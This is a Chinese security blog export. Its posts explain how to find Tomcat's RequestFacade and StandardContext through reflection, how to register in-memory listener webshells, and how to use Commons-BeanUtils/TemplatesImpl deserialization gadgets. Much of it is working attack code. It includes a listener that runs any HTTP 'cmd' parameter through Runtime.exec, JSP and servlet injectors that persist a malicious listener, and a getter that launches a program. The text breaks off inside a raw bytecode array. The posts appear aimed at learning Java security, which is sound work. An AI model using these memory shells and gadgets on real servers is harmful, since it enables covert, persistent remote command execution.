到这里我们获取了所有TaskThread的字段，字段的种类有很多我们需筛选，显然java提供的八种基础类型不是我们需要的。我们需要的类型是引用数据类型，也就是可能存在对象或者集合（集合里面可能存在其他类）。这里我们可以创建一个黑名单，在黑名单里面的我们不进行输出。到这里我们的Object的处理逻辑就清晰了，先判断是否是黑名单，如果是普通对象那么就进行取值，如果是集合类型或者是数组类型的我们将数组内的所有值都取出来。 123456789101112131415161718192021222324252627282930//黑名单public static boolean isblack(String s) &#123; Boolean aBoolean = false; List&lt;String&gt; black = new ArrayList&lt;String&gt;(Arrays.asList(&quot;java.lang.Byte&quot;, &quot;java.lang.Short&quot;, &quot;java.lang.Integer&quot;, &quot;java.lang.Long&quot;, &quot;java.lang.Float&quot;, &quot;java.lang.Boolean&quot;, &quot;java.lang.String&quot;, &quot;java.lang.Class&quot;, &quot;java.lang.Character&quot;, &quot;java.io.File&quot;, &quot;byte&quot;, &quot;short&quot;, &quot;int&quot;, &quot;long&quot;, &quot;double&quot;, &quot;float&quot;, &quot;boolean&quot; )); for (int i = 0; i &lt; black.size(); i++) &#123; if (s == black.get(i)) &#123; aBoolean = true; return aBoolean; &#125; &#125; return aBoolean; &#125; 123456789//判断listpublic static boolean is_list(String s) &#123; boolean b = false; if (&quot;List&quot;.equals(s) || &quot;ArrayList&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; 123456789//判断mappublic static boolean is_map(String s) &#123; boolean b = false; if (&quot;Map&quot;.equals(s) || &quot;HashMap&quot;.equals(s))&#123; b = true; return b; &#125; return b; &#125; 这里我们使用广度优先搜索算法去遍历所有的变量。这里我们定义一个类似于c语言结构体的类，用来存储状态。 12345678910public class location &#123; public location(Object obj, String clazz, String path) &#123; this.obj = obj; this.path = path; this.clazz = clazz; &#125; public Object obj; public String path; public String clazz;&#125; 既然是广度优先搜索，我们还需要一个队列，表示有哪些需要进行搜索，还需要一个SET，set会记录哪些被搜索过了，防止被重复搜索。 12static Queue&lt;location&gt; queue = new LinkedList&lt;location&gt;();//队列保证广度优先搜索static Set&lt;Object&gt; set = new HashSet&lt;Object&gt;();//set记录哪些对象被搜索过 我们再创建一个白名单 12345678910//白名单public static boolean is_target(Field f,Object o) throws IllegalAccessException, ClassNotFoundException &#123; boolean b = false; if ( f.get(o).getClass().isAssignableFrom(Class.forName(&quot;org.apache.catalina.connector.RequestFacade&quot;)) &amp;&amp; f.get(o).getClass().getName() !=&quot;java.lang.Object&quot; )&#123; return true; &#125; return b; &#125; 接下来我们设计广度优先搜索的入口： 12345678910public static void search() throws ClassNotFoundException &#123; location laco = new location(Thread.currentThread(), &quot;org.apache.tomcat.util.threads.TaskThread&quot;,&quot;TaskThread&quot;); queue.offer(laco); set.add(Thread.currentThread()); int i=0; while (queue.size()&gt;0) &#123; i++; basic_search.basic_search(queue.poll()); &#125; &#125; 这里看一下写的basic_search() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990 public static void basic_search(location lcat) throws ClassNotFoundException &#123; Object obj = lcat.obj; String path = lcat.path; Class clazz = Class.forName(lcat.clazz); try &#123;// Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;); for (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123; Field fields[] = clazz.getDeclaredFields(); for (int i = 0; i &lt; fields.length; i++) &#123; fields[i].setAccessible(true); if (fields[i].get(obj) == null)&#123;continue;&#125; if (!Black.isblack(fields[i].getType().getName()) &amp;&amp; fields[i].get(obj) != null &amp;&amp; set.add(fields[i].get(obj))) &#123; if (judge_map.is_map(fields[i].getType().getSimpleName())) &#123; Map map = (Map) fields[i].get(obj); if (map.size() &gt; 0) &#123; for (int map_num = 0; map_num &lt; map.size(); map_num++) &#123; Object map_obj = map.get(map_num); if (map_obj != null &amp;&amp; set.add(map_obj) &amp;&amp; !Black.isblack(map_obj.getClass().getName())) &#123; location l = new location(map_obj, map_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;+map_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (judge_list.is_list(fields[i].getType().getSimpleName())) &#123; List list = (List) fields[i].get(obj); if (list.size() &gt; 0) &#123; for (int list_num = 0; list_num &lt; list.size(); list_num++) &#123; Object list_obj = list.get(list_num); if (list_obj != null &amp;&amp; set.add(list_obj) &amp;&amp; !Black.isblack(list_obj.getClass().getName())) &#123; location l = new location(list_obj, list_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + list_num + &quot;]&quot;+list_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + list_obj.getClass().getName()+&quot;[&quot; + list_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; continue; &#125; else if (fields[i].getType().isArray()) &#123;// Object objarr1 = fields[i].get(obj); try &#123; Object[] arrobj = (Object[])fields[i].get(obj); if (arrobj.length &gt; 0) &#123; for (int obj_num = 0; obj_num &lt; arrobj.length; obj_num++) &#123; Object arr_obj = arrobj[obj_num]; if (arr_obj != null &amp;&amp; set.add(arr_obj) &amp;&amp; !Black.isblack(arr_obj.getClass().getName())) &#123; location l = new location(arr_obj, arr_obj.getClass().getName(), path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + obj_num + &quot;]&quot;+arr_obj.getClass().getName());// System.out.println(path + &quot;--&gt;&quot; + fields[i].getClass().getName() + &quot;[&quot; + obj_num + &quot;]&quot;); queue.offer(l); &#125; &#125; &#125; &#125;catch (Throwable e)&#123;// System.out.println(fields[i].get(obj)); &#125; continue; &#125; if (target.is_target(fields[i],obj)) &#123; System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); &#125; location l = new location(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); search.queue.offer(l);// System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;); &#125; &#125; &#125; &#125; catch (IllegalAccessException ex) &#123; throw new RuntimeException(ex); &#125; &#125; 全部完整代码上传至https://github.com/f19t/java-Object-simple-search/ 因为我们为了让回显和写内存马更方便，我们这里只搜了RequestFacade，我们简单写一个simple去搜索一下。 1234567891011121314//simple@WebServlet(&quot;/simple&quot;)public class simple extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; try &#123; search.search(); &#125; catch (ClassNotFoundException e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 得到的输出是: 12345678TaskThread---&gt;group(java.lang.ThreadGroup)--&gt;threads[14]java.lang.Thread---&gt;target(org.apache.tomcat.util.net.NioEndpoint$Poller)---&gt;this$0(org.apache.tomcat.util.net.NioEndpoint)---&gt;handler(org.apache.coyote.AbstractProtocol$ConnectionHandler)---&gt;global(org.apache.coyote.RequestGroupInfo)--&gt;processors[0]org.apache.coyote.RequestInfo---&gt;req(org.apache.coyote.Request)--&gt;notes[1]org.apache.catalina.connector.Request---&gt;applicationRequest(org.apache.catalina.connector.RequestFacade) 这里就表明我们已经成功搜索并拿到了当前线程的RequestFacade。有了RequestFacade我们就可以拿到StandardContext,下面操作在 if (target.is_target(fields[i],obj)) {} 里面执行 1234567RequestFacade reqfd = (RequestFacade) fields[i].get(obj);Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);f.setAccessible(true);//因为是protectedRequest req = (Request) f.get(reqfd);//反射获取值StandardContext context = (StandardContext) req.getContext();ServletRequestListener listener = new ServletRequestListener() &#123;&#125;;context.addApplicationEventListener(listener); 也可以拿到当前线程的response 123456789RequestFacade reqfd = (RequestFacade) fields[i].get(obj);Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);f.setAccessible(true);//因为是protectedRequest req = (Request) f.get(reqfd);//反射获取值Field ff = req.getClass().getDeclaredField(&quot;response&quot;);ff.setAccessible(true);Response resp = (Response) ff.get(req);PrintWriter out = resp.getWriter();out.println(&quot;wwwwww&quot;); 我们可以很方便的把上面的代码组装成一个类，这样我们反序列化的时候可以使用加载字节码的方式执行我们的回显代码或者添加内存马。 完整代码 1https://github.com/f19t/java-Object-simple-search/blob/main/search-object/src/main/java/com/f19t/searchobject/searchobject/search_utill.java 反序列化简单利用我们把要执行的代码放到构建的AbstractTranslet类里面。 123Class f = Class.forName(&quot;org.hang.web_test.location&quot;);Method method = f.getMethod(&quot;search&quot;);method.invoke(null); 生成序列化数据，这里用的cc6反序列化执行代码。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"tomcat动态注册内存马","slug":"tomcat动态注册内存马","date":"2023-03-06T09:53:43.000Z","updated":"2023-03-06T10:40:41.824Z","comments":true,"path":"2023/03/06/tomcat动态注册内存马/","link":"","permalink":"https://f19t.github.io.git/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/","excerpt":"tomcat动态注册内存马去年10月学了一段时间内存马，并没有好好整理这段知识，今天重新梳理一下tomcat内存马的相关知识。","text":"tomcat动态注册内存马去年10月学了一段时间内存马，并没有好好整理这段知识，今天重新梳理一下tomcat内存马的相关知识。 javax.servlet.ServletContext首先为什么我们可以在容器中动态添加内存马，那是因为Servlet 3.0提供了动态注册这种机制，我们可以看到在javax.servlet.ServletContext接口中定义了如addServlet、addFilter、addListener这些接口。正因为有了这些接口，我们可以在具体的实现这些接口的类里面进行动态添加内存马。 123456789101112131415public interface ServletContext &#123; &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; var1) throws ServletException; ServletRegistration.Dynamic addServlet(String var1, Class&lt;? extends Servlet&gt; var2); FilterRegistration.Dynamic addFilter(String var1, Class&lt;? extends Filter&gt; var2); &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException; void addListener(Class&lt;? extends EventListener&gt; var1); &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; var1) throws ServletException; void addListener(Class&lt;? extends EventListener&gt; var1); &#125; 当我们使用的容器是tomcat时，我们使用idea查找所有实现ServletContext接口的类我们发现有五个。在不了解tomcat是如何添加addServlet、addFilter、addListener前提下我们也可以知道，动态添加内存马的关键在这五个类里面。 tomcat注册ListenerListener类都是实现了EventListener接口的类，所以实现类有很多，这里我们看一下实现了EventListener接口的ServletRequestListener接口。他有两个待实现函数，分别代表着request初始化时监听和request销毁时监听，非常适合做内存马。 123456789package javax.servlet;import java.util.EventListener;public interface ServletRequestListener extends EventListener &#123; void requestDestroyed(ServletRequestEvent var1); void requestInitialized(ServletRequestEvent var1);&#125; 我们实现一个简单的ServletRequestListener看一下linsener是如何被调用的。这里我们写的是requestDestroyed，因为每次请求结束request对象就会被销毁，所以可以调用到我们的监听。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import javax.servlet.*;import javax.servlet.annotation.WebListener;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;@WebListener(&quot;/TestListener&quot;)public class shell_linsener implements ServletRequestListener &#123; @Override public void requestDestroyed(ServletRequestEvent s) &#123; HttpServletRequest req = (HttpServletRequest) s.getServletRequest();//下断点 String cmd = req.getParameter(&quot;cmd&quot;); try&#123; Field reqField = req.getClass().getDeclaredField(&quot;request&quot;); reqField.setAccessible(true); // org.apache.catalina.connector.Request Object reqObj = reqField.get(req); // org.apache.catalina.connector.Response HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod(&quot;getResponse&quot;).invoke(reqObj); PrintWriter out = rep.getWriter();// rep.sendError(404); out.println(&quot;linsener_resp_test&quot;); &#125;catch(NoSuchFieldException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e)&#123; e.printStackTrace(); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; if (cmd != null)&#123; try &#123; Runtime.getRuntime().exec(cmd); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; catch (NullPointerException n) &#123; n.printStackTrace(); &#125; &#125; &#125; @Override public void requestInitialized(ServletRequestEvent s) &#123; &#125;&#125; 我们在HttpServletRequest req &#x3D; (HttpServletRequest) s.getServletRequest();这一行下断点。会发现调用链。 12345678910111213141516requestDestroyed:22, shell_linsener (org.hang.web_test)fireRequestDestroyEvent:6019, StandardContext (org.apache.catalina.core)invoke:177, StandardHostValve (org.apache.catalina.core)invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:367, CoyoteAdapter (org.apache.catalina.connector)service:639, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) fireRequestDestroyEvent调用了我们写的linsener，我们跟进fireRequestDestroyEvent看一下他是逻辑是怎么样的。 123456789101112131415161718192021222324public boolean fireRequestDestroyEvent(ServletRequest request) &#123; Object[] instances = this.getApplicationEventListeners();//获取所有的listener if (instances != null &amp;&amp; instances.length &gt; 0) &#123; ServletRequestEvent event = new ServletRequestEvent(this.getServletContext(), request); for(int i = 0; i &lt; instances.length; ++i) &#123; int j = instances.length - 1 - i; if (instances[j] != null &amp;&amp; instances[j] instanceof ServletRequestListener) &#123; ServletRequestListener listener = (ServletRequestListener)instances[j]; try &#123; listener.requestDestroyed(event); &#125; catch (Throwable var8) &#123; ExceptionUtils.handleThrowable(var8); this.getLogger().error(sm.getString(&quot;standardContext.requestListener.requestInit&quot;, new Object[]&#123;instances[j].getClass().getName()&#125;), var8); request.setAttribute(&quot;javax.servlet.error.exception&quot;, var8); return false; &#125; &#125; &#125; &#125; return true;&#125; 关键代码Object[] instances &#x3D; this.getApplicationEventListeners();意思是获取所有的linsener并形成数组，如果数组不为空，则执行每个数组的listener.requestDestroyed(event); 这里我们再继续看一下getApplicationEventListeners()这个方法。位于org.apache.catalina.core.StandardContext，可以看到返回的是applicationEventListenersList这个数组。 123public Object[] getApplicationEventListeners() &#123; return this.applicationEventListenersList.toArray(); &#125; 我们再看一下applicationEventListenersList这个列表是哪里来的。可以看到他是一个CopyOnWriteArrayList数组，既然是数组我们就可以使用add方法进行添加。 1private List&lt;Object&gt; applicationEventListenersList = new CopyOnWriteArrayList(); 所以我们在org.apache.catalina.core.StandardContext找一下哪里调用了applicationEventListenersList。add方法。 我们找到了两个地方可以调用add。 1234567891011public void setApplicationEventListeners(Object[] listeners) &#123; this.applicationEventListenersList.clear(); if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123; this.applicationEventListenersList.addAll(Arrays.asList(listeners)); &#125; &#125; public void addApplicationEventListener(Object listener) &#123; this.applicationEventListenersList.add(listener); &#125; 学了反射我们有很多种方式可以在我们自己创建的StandardContext中添加我们的listeners（在我们的环境中）。下放列举一种例如： 12345Class c = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;);Constructor ct1 = c.getConstructor();//不会初始化，无参构造StandardContext obj = (StandardContext)ct1.newInstance();ServletRequestListener listener = new ServletRequestListener() &#123;&#125;obj.addApplicationEventListener(listener); 但是由于tomcat架构的原因，我们不能这样操作，我们得添加到对方的StandardContext里面去。 那么如何才能获取到当前应用的StandardContext呢，也就是当前运行中tomcat的StandardContext呢。还是看我们的调用链，我们在invoke:177, StandardHostValve (org.apache.catalina.core)&#x2F;&#x2F;看这一行，跟进去一下。 12345678910111213141516requestDestroyed:22, shell_linsener (org.hang.web_test)fireRequestDestroyEvent:6019, StandardContext (org.apache.catalina.core)invoke:177, StandardHostValve (org.apache.catalina.core)//看这一行invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:367, CoyoteAdapter (org.apache.catalina.connector)service:639, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) 发现他调用了context.fireRequestDestroyEvent 123if (!request.isAsync() &amp;&amp; !asyncAtStart) &#123; context.fireRequestDestroyEvent(request.getRequest()); &#125; 然后我们再找一下context.fireRequestDestroyEvent的context是哪里来的，发现 Context context &#x3D; request.getContext(); 也就是说可以通过当前应用的request来获取当前应用的context。 123456public final void invoke(Request request, Response response) throws IOException, ServletException &#123; Context context = request.getContext(); if (context == null) &#123; if (!response.isError()) &#123; response.sendError(404); &#125; 我们去org.apache.catalina.connector.Request包里，也是可以发现存在getContext方法。 123public Context getContext() &#123; return this.mappingData.context; &#125; 也就是说我们可以通过Request来获取Context，那我们如何获取当前应用的Request呢。 JSP写Listener首先我们先看jsp如何写Listener。因为jsp内置了Request，我们写个简单的程序下断点跟进一下。 123&lt;% HttpSession s = request.getSession();//下断点%&gt; 我们可以看到请求的过程中存在request和response，他们的对象为RequestFacade 1234567891011121314151617181920212223242526272829_jspService:16, test_jsp (org.apache.jsp)service:70, HttpJspBase (org.apache.jasper.runtime)service:765, HttpServlet (javax.servlet.http)service:465, JspServletWrapper (org.apache.jasper.servlet)serviceJspFile:383, JspServlet (org.apache.jasper.servlet)service:331, JspServlet (org.apache.jasper.servlet)service:765, HttpServlet (javax.servlet.http)internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)doFilter:52, WsFilter (org.apache.tomcat.websocket.server)internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)doFilter:166, ApplicationFilterChain (org.apache.catalina.core)invoke:197, StandardWrapperValve (org.apache.catalina.core)invoke:97, StandardContextValve (org.apache.catalina.core)invoke:543, AuthenticatorBase (org.apache.catalina.authenticator)invoke:135, StandardHostValve (org.apache.catalina.core)invoke:92, ErrorReportValve (org.apache.catalina.valves)invoke:698, AbstractAccessLogValve (org.apache.catalina.valves)invoke:78, StandardEngineValve (org.apache.catalina.core)service:367, CoyoteAdapter (org.apache.catalina.connector)service:639, Http11Processor (org.apache.coyote.http11)process:65, AbstractProcessorLight (org.apache.coyote)process:885, AbstractProtocol$ConnectionHandler (org.apache.coyote)doRun:1693, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)run:49, SocketProcessorBase (org.apache.tomcat.util.net)runWorker:1191, ThreadPoolExecutor (org.apache.tomcat.util.threads)run:659, ThreadPoolExecutor$Worker (org.apache.tomcat.util.threads)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:748, Thread (java.lang) 我们查看一下RequestFacade，发现其存在Request变量。 12public class RequestFacade implements HttpServletRequest &#123; protected Request request = null;&#125; 所以这里我们可以通过反射RequestFacade获取Request。 1234Field f = request.getClass().getDeclaredField(&quot;request&quot;);f.setAccessible(true);//因为是protectedRequest req = (Request) f.get(request);//反射获取值StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext 完整jsp代码如下： 1234567891011121314151617181920212223242526272829303132&lt;% Field f = request.getClass().getDeclaredField(&quot;request&quot;); f.setAccessible(true);//因为是protected Request req = (Request) f.get(request);//反射获取值 StandardContext context = (StandardContext) req.getContext(); //直接通过request获取StandardContext ServletRequestListener listener = new ServletRequestListener() &#123; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; &#125; @Override public void requestInitialized(ServletRequestEvent sre) &#123; HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); try &#123; Field reqField = req.getClass().getDeclaredField(&quot;request&quot;); reqField.setAccessible(true); // org.apache.catalina.connector.Request Object reqObj = reqField.get(req); // org.apache.catalina.connector.Response HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod(&quot;getResponse&quot;).invoke(reqObj); PrintWriter out = rep.getWriter(); out.println(&quot;d_add_hack&quot;); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;; context.addApplicationEventListener(listener);%&gt; 访问jsp文件发现linsener成功添加。 Servlet写Listener因为普通的Servlet继承了HttpServlet，里面包含HttpServletRequest和HttpServletResponse，我们发现具体实现类还是RequestFacade，那么我们可以和jsp一样的构造。访问即可成功添加Listener 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import org.apache.catalina.connector.Request;import org.apache.catalina.core.StandardContext;import javax.servlet.ServletException;import javax.servlet.ServletRequestEvent;import javax.servlet.ServletRequestListener;import javax.servlet.annotation.WebServlet;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.InvocationTargetException;/** * author: f19t * Date: 2023/2/28 16:45 */@WebServlet(value = &quot;/test_StandardContext&quot;)public class Test_StandardContext extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; Request req1 = null; try &#123; Field f = req.getClass().getDeclaredField(&quot;request&quot;); f.setAccessible(true); req1 = (Request) f.get(req); StandardContext obj = (StandardContext) req1.getContext(); ServletRequestListener listener = new ServletRequestListener() &#123; @Override public void requestDestroyed(ServletRequestEvent sre) &#123; &#125; @Override public void requestInitialized(ServletRequestEvent sre) &#123; HttpServletRequest req = (HttpServletRequest) sre.getServletRequest(); try &#123; Field reqField = req.getClass().getDeclaredField(&quot;request&quot;); reqField.setAccessible(true); // org.apache.catalina.connector.Request Object reqObj = reqField.get(req); // org.apache.catalina.connector.Response HttpServletResponse rep = (HttpServletResponse) reqObj.getClass().getDeclaredMethod(&quot;getResponse&quot;).invoke(reqObj); PrintWriter out = rep.getWriter(); out.println(&quot;d_add_hack&quot;); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; &#125;; obj.addApplicationEventListener(listener); &#125; catch (IllegalAccessException e) &#123; throw new RuntimeException(e); &#125; catch (NoSuchFieldException e) &#123; throw new RuntimeException(e); &#125; &#125; &#125; 后记：当然还有其他方法获取StandardContext，但是不如上面使用的代码简便，下发贴了截图，有兴趣的可以自己调试一下。 当我们想反序列化写内存马的时候，或者想做命令执行回显的时候，我们也是需要获取到当前应用的StandardContext，或者是当前应用的request。我们下一篇学一下如何在目标当前线程中获取request。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"CB基础知识","slug":"CB基础知识","date":"2023-02-27T11:48:35.000Z","updated":"2023-02-27T11:51:41.964Z","comments":true,"path":"2023/02/27/CB基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/27/CB%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CB基础知识简单整理一下CB的基础知识。","text":"CB基础知识简单整理一下CB的基础知识。 getPropertygetProperty是org.apache.commons.beanutils包提供的一个静态方法PropertyUtils.getProperty().他的构造函数的参数为Object bean, String name。 123public static Object getProperty(Object bean, String name) throws IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123; return PropertyUtilsBean.getInstance().getProperty(bean, name); &#125; 使用一下测试类来验证PropertyUtils.getProperty()的作用。 注意： javabean的getter的类型是T，不能是void。 javabean的setter的类型是void。 PropertyUtils.getProperty(Object bean, String name)，调用的name需要无参。（暂时这样理解，不确定是不是也可以构造有参的,后续有其他了解，再进行补充。） 12345678910111213141516171819import java.io.IOException;/** * author: f19t * Date: 2023/2/27 14:35 */public class My_bean &#123; private String name = &quot;catalina&quot;; private My_bean() &#123; System.out.println(&quot;无参构造&quot;); &#125; public String getExec() throws IOException &#123; Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); return &quot;&quot;; &#125;&#125; 运行下方代码可成功弹计算机。 1234567891011121314151617181920import org.apache.commons.beanutils.*;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;/** * author: f19t * Date: 2023/2/27 14:20 */public class Test_commons_beanutils &#123; public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException &#123; Class c1 = Class.forName(&quot;My_bean&quot;); Constructor ct1 = c1.getDeclaredConstructor();//不会初始化，无参构造 ct1.setAccessible(true); Object obj = ct1.newInstance();//初始化执行 PropertyUtils.getProperty(obj,&quot;exec&quot;); &#125;&#125; TemplatesImplCB基础知识，这里为什么讲TemplatesImpl呢，因为TemplatesImpl里包含多个getter、setter，首先先介绍一下TemplatesImpl如何执行字节码吧。 TemplatesImpl中的TransletClassLoader类，重写了defineClass方法，并且不是protected类型的,可以被外部调用. newTransformer可以调用到defineClass，导致执行字节码。（入口1） 12345defineClass:185, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)defineTransletClasses:414, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getTransletInstance:451, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)main:106, Test_commons_beanutils (ysoserial) 测试代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.*;import java.io.IOException;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/27 14:20 */public class Test_commons_beanutils &#123; public static void main(String[] args) throws Exception &#123; byte[] testClassBytes = new byte[]&#123;-54 ,-2 ,-70 ,-66 ,0 ,0 ,0 ,52 ,0 ,47 ,10 ,0 ,9 ,0 ,22 , 10 ,0 ,23 ,0 ,24 ,8 ,0 ,25 ,10 ,0 ,23 ,0 ,26 ,9 ,0 , 27 ,0 ,28 ,8 ,0 ,29 ,10 ,0 ,30 ,0 ,31 ,7 ,0 ,32 ,7 , 0 ,33 ,1 ,0 ,9 ,116 ,114 ,97 ,110 ,115 ,102 ,111 ,114 ,109 ,1 , 0 ,114 ,40 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 , 47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 , 110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 , 79 ,77 ,59 ,91 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,4 ,67 , 111 ,100 ,101 ,1 ,0 ,15 ,76 ,105 ,110 ,101 ,78 ,117 ,109 ,98 ,101 , 114 ,84 ,97 ,98 ,108 ,101 ,1 ,0 ,10 ,69 ,120 ,99 ,101 ,112 ,116 , 105 ,111 ,110 ,115 ,7 ,0 ,34 ,1 ,0 ,-90 ,40 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 , 47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 ,79 ,77 ,59 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,109 ,108 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,100 , 116 ,109 ,47 ,68 ,84 ,77 ,65 ,120 ,105 ,115 ,73 ,116 ,101 ,114 ,97 , 116 ,111 ,114 ,59 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 